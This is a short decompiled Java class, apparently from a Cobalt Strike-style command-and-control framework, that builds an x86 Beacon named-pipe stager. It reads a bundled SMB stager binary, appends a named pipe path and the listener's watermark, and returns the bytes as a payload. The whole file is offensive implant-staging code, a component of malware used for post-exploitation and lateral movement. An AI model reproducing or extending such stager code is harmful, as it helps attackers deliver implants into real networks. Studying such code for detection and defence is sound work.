package stagers;

import common.CommonUtils;
import common.ScListener;

public class BeaconPipeStagerX86 {
   protected ScListener listener;

   public BeaconPipeStagerX86(ScListener var1) {
      this.listener = var1;
   }

   public String arch() {
      return "x86";
   }

   public byte[] generate(String var1) {
      String var2 = CommonUtils.bString(CommonUtils.readResource("resources/smbstager.bin"));
      var2 = var2 + "\\\\.\\pipe\\" + var1 + '\u0000' + this.listener.getConfig().getWatermark();
      return CommonUtils.toBytes(var2);
   }
}
